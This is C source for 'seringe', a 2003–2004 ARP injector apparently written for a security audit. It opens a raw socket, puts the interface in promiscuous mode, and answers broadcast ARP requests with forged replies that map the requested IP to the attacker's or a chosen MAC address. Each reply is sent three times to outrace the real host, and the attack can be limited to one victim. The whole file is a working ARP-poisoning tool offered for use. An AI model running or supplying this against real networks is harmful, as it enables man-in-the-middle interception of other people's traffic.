/*
   seringe v0.2: arp injector and redirector
   Copyright 2003,2004 - Michael Hendrickx (michael@scanit.be)

   intercepts arp requests, sends "own" mac address (or -m arg). 
   Without libnet, libpcap or any other libraries.. made during
   a security audit when i had no access to these libraries.

   todo: accept ip addr arguments with -m and -f 

 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/sockios.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <signal.h>

#define IFACE "eth0"
#define VERSION "0.2"

/* global vars - tsk tsk */

int verbosity, // verbose flag
sockfd; // our socket
unsigned int counter = 0;
FILE *logfd = NULL; // our logfile
extern int errno;

// 'borrowed' from if_arp.h, #include gave errors
struct arphdr
{
	unsigned short arp_hrdad; // hardware addr format
	unsigned short arp_prot; // protocol address format
	unsigned char arp_halen; // hardware addr length
	unsigned char arp_prlen; // protocol address length
	unsigned short arp_opcode; // arp opcode (command)

	unsigned char ar_sha[ETH_ALEN];
	unsigned char ar_sip[4];
	unsigned char ar_tha[ETH_ALEN];
	unsigned char ar_tip[4];
};

struct packet
{
	struct ethhdr ethhdr;
	struct arphdr arphdr;
} *ppacket;

//clean shutdown of the program
void cleanup(int sig){
	if(sockfd>0) close(sockfd);
	if(logfd>0) fclose(logfd);
	if(ppacket) free(ppacket); // save the whales, free the malloc()s
	fprintf(stdout, "\nseringe terminated with signal %d\n", sig);
	fprintf(stdout, "%d arp requests \"fullfilled\"\n", counter);
	exit(sig);
}

void usage(char *p){
	fprintf(stderr, "usage: %s [-vhp] [-l <file>] [-i <iface>] [-f <addr>] [-m <addr>]\n", p);
	fprintf(stderr, "where: -l <file> : log activity to <file>\n");
	fprintf(stderr, " -i <iface> : which interface to use (default: %s)\n", IFACE);
	fprintf(stderr, " -f <addr> : only \"poison\" this machine (hwaddr)\n");
	fprintf(stderr, " -m <addr> : send this hwaddr instead of own mac addr\n");
	fprintf(stderr, " -p : don't put interface in promiscious mode\n");
	fprintf(stderr, " -h : this screen\n");
	fprintf(stderr, " -v : verbosity\n");
	fprintf(stderr, "\nnote: use this tool with responsibility\n");
	exit(1);
}

// gets hwaddr of *iface
void getmymac(char *iface, unsigned char *hwaddr){
	struct ifreq ifr;
	signed int tmpsock;

	memset(&ifr, 0x0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, iface, IF_NAMESIZE-1);
	if((tmpsock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket"); exit(1); }
	if(ioctl(tmpsock, SIOCGIFHWADDR, &ifr)< 0){
		close(tmpsock); perror("ioctl()"); exit(1); }

	memcpy(hwaddr, (unsigned char *)&ifr.ifr_hwaddr.sa_data, 6);
	close(tmpsock);
}

// gets the interface *iface's index number
unsigned int getifndx(char *iface){
	struct ifreq ifr;
	signed int tmpsock;

	memset(&ifr, 0x0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, iface, IF_NAMESIZE-1);
	if((tmpsock = socket(AF_INET,SOCK_STREAM,0))< 0){
		perror("socket"); cleanup(1); }
	if(ioctl(tmpsock, SIOCGIFINDEX, &ifr)< 0){
		close(tmpsock); perror("ioctl"); cleanup(1); }

	close(tmpsock);
	return ifr.ifr_ifindex;
}

// sets interface in promiscious mode
unsigned int setprom(char *iface){
	struct ifreq ifr;
	signed int tmpsock;

	memset(&ifr, 0x0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, iface, IF_NAMESIZE-1);
	tmpsock = socket(AF_INET,SOCK_STREAM,0);
	if(ioctl(tmpsock, SIOCGIFFLAGS, &ifr)< 0){
		close(tmpsock); perror("ioctl"); cleanup(1); }
	ifr.ifr_flags = (ifr.ifr_flags | IFF_PROMISC);
	if(ioctl(tmpsock, SIOCSIFFLAGS, &ifr)< 0){
		close(tmpsock); return 1; }

	close(tmpsock);
	return 0;
}

#define ETH_NULL "\x00\x00\x00\x00\x00\x00"
#define ETH_BCAST "\xff\xff\xff\xff\xff\xff"

// linux/if_arp.h defs
#ifndef ARPHRD_ETHER
#define ARPHRD_ETHER 1
#endif
#ifndef ARPOP_REQUEST
#define ARPOP_REQUEST 1
#endif
#ifndef ARPOP_REPLY
#define ARPOP_REPLY 2
#endif

void logtofile(char *msg){
	if(fprintf(logfd, "%s", msg) < 1)
		fprintf(stderr, " [e] error writing to logfile\n");
}

unsigned int handle(struct packet *input, unsigned char filter[ETH_ALEN]){

	// if we are filtering, other packets should be dropped
	if(memcmp(filter, ETH_NULL, 6))
		if(memcmp(input->ethhdr.h_source, filter, ETH_ALEN)) return 0;

	// everything that is not a ethernet broadcast should be denied
	if(memcmp(input->ethhdr.h_dest, ETH_BCAST, ETH_ALEN)) return 0;
	// (also for passing?)

	// if it is not an normal arp request, drop it
	if(input->ethhdr.h_proto != htons(ETH_P_ARP)) return 0;
	if(input->arphdr.arp_hrdad != htons(ARPHRD_ETHER)) return 0;
	if(input->arphdr.arp_prot != htons(ETH_P_IP)) return 0;
	if(input->arphdr.arp_opcode != htons(ARPOP_REQUEST)) return 0;

	// it's an arp request
	counter++;

	if(logfd||verbosity){
		char *logmsg = malloc(256);
		snprintf(logmsg, 255, "%4d : %d.%d.%d.%d : who has %d.%d.%d.%d ?",
				counter,
				input->arphdr.ar_sip[0],input->arphdr.ar_sip[1],
				input->arphdr.ar_sip[2],input->arphdr.ar_sip[3],
				input->arphdr.ar_tip[0],input->arphdr.ar_tip[1],
				input->arphdr.ar_tip[2],input->arphdr.ar_tip[3]);

		if(logfd) logtofile(logmsg); // write to logfile
		if(verbosity > 0) printf(logmsg); // write to screen
		free(logmsg);
	}

	return 1;
}

void inject(struct packet *input, unsigned char hwaddr[ETH_ALEN]){
	struct packet *output = malloc(sizeof(struct packet));
	unsigned int i;

	// Ethernet header
	memcpy(output->ethhdr.h_dest, input->ethhdr.h_source, ETH_ALEN);
	memcpy(output->ethhdr.h_source, hwaddr, ETH_ALEN);
	output->ethhdr.h_proto = htons(ETH_P_ARP);

	// ARP header
	output->arphdr.arp_hrdad = htons(ARPHRD_ETHER);
	output->arphdr.arp_prot = htons(ETH_P_IP);
	output->arphdr.arp_halen = ETH_ALEN;
	output->arphdr.arp_prlen = 4;
	output->arphdr.arp_opcode = htons(ARPOP_REPLY);

	// copy our mac addr as mac addr of "requested ip"
	memcpy(output->arphdr.ar_sha, hwaddr, ETH_ALEN);

	// but use "his" ip address.
	memcpy(output->arphdr.ar_sip, input->arphdr.ar_tip, 4);

	// dest = the machine who wanted the info
	memcpy(output->arphdr.ar_tha, input->arphdr.ar_sha, ETH_ALEN);
	memcpy(output->arphdr.ar_tip, input->arphdr.ar_sip, 4);

	// sent the packet, three times, to not be overwritten by slower, real hosts
	for(i=0 ; i < 3 ; i++){
		if(write(sockfd, output, sizeof(struct packet)) < 0){
			perror("write");
			cleanup(1);
		}
		usleep(500);
	}

	if(logfd||verbosity){
		char *logmsg = malloc(256);
		snprintf(logmsg, 255, " -> %02x:%02x:%02x:%02x:%02x:%02x\n",
				hwaddr[0],hwaddr[1],hwaddr[2],hwaddr[3],hwaddr[4],hwaddr[5]);
		if(logfd) logtofile(logmsg); // write to logfile
		if(verbosity > 0) printf(logmsg); // write to screen
		free(logmsg);
	}
}

int main(int argc, char *argv[], char *envp[]){
	// variables
	int c; // getopt
	char *logfn = "", // logfile
			*iface = "", // which interface
			flmyhw = 0, // flag for own hardware addr
			flprom = 1; // flag to set interface in prom mode
	unsigned char hwaddr[IFHWADDRLEN], // 6char macaddr
			filaddr[IFHWADDRLEN] = { 0x0 }; // if we should filter, filter on this one

	struct sockaddr_ll sll = { 0x0 }; // lowlevel interface stuff

	// start
	fprintf(stdout, "seringe v%s: arp injector\n", VERSION);
	fprintf(stdout, "by michael@scanit.be\n\n");

	if(argc == 1) fprintf(stdout, "note: run -h to see available options\n");

	while(1){
		c = getopt(argc, argv, "hl:vpm:i:f:");
		if(c==-1) break;
		switch(c)
		{
		case 'h':
			usage(argv[0]);
			break;
		case 'l':
			logfn = optarg;
			logfd = fopen(optarg, "w+");
			if(logfd == NULL){ perror("fopen"); exit(1); }
			break;
		case 'v':
			verbosity++;
			break;
		case 'm':
			flmyhw = 1;
			if(sscanf(optarg,"%x:%x:%x:%x:%x:%x",
					hwaddr, hwaddr+1, hwaddr+2,
					hwaddr+3,hwaddr+4, hwaddr+5)!=6){
				fprintf(stderr, " [e] unable parse hwaddr \"%s\"\n\n",optarg);
				cleanup(1);
			}
			break;
		case 'f':
			if(sscanf(optarg,"%x:%x:%x:%x:%x:%x",
					filaddr, filaddr+1, filaddr+2,
					filaddr+3, filaddr+4, filaddr+5)!=6){
				fprintf(stderr, " [e] unable parse hwaddr \"%s\"\n\n",optarg);
				exit(1);
			}
			break;

		case 'i':
			iface = optarg;
			break;
		case 'p':
			flprom = 0;
		default:
			break;
		}
	}

	if(strlen(iface) == 0) iface = IFACE;
	if(!flmyhw) getmymac(iface, hwaddr);

	if(verbosity > 0){
		if(strlen(logfn)>0) fprintf(stdout, " [i] logging to %s\n", logfn);
		fprintf(stdout, " [i] arp reply will be %02x:%02x:%02x:%02x:%02x:%02x\n",
				hwaddr[0], hwaddr[1],hwaddr[2],hwaddr[3],hwaddr[4], hwaddr[5]);
		fprintf(stdout, " [i] looking for arp requests ");
		if(memcmp(ETH_NULL, filaddr, 6))
			fprintf(stdout, "coming from %02x:%02x:%02x:%02x:%02x:%02x\n",
					filaddr[0], filaddr[1],filaddr[2],filaddr[3],filaddr[4],filaddr[5]);
		else
			fprintf(stdout, "\n");
	}

	// set signals
	signal(SIGHUP, SIG_IGN);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);
	signal(SIGKILL, cleanup);
	signal(SIGQUIT, cleanup);

	// open raw socket
	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); // or ETH_P_ALL?
	if(sockfd < 0){ perror("socket"); exit(1); }

	// set in promiscious mode if requested
	if(flprom)
		if(setprom(iface))
			fprintf(stdout, " [e] could not set %s in promiscious mode\n", iface);

	// setup sockaddr_ll, to talk through this iface
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = getifndx(iface);

	if(bind(sockfd, (struct sockaddr*)&sll, sizeof(sll)) == -1){
		perror("bind");
		cleanup(0);
	}

	// make space
	ppacket = malloc(sizeof(struct packet));

	// and.. sniff
	while(1){
		memset(ppacket, 0x0, sizeof(struct packet));
		read(sockfd, ppacket, (sizeof(struct packet)));
		if(handle(ppacket, filaddr) == 1) inject(ppacket, hwaddr);
	}

	// khalas :)
	return 0; // to keep -Wall happy, we never come here
}

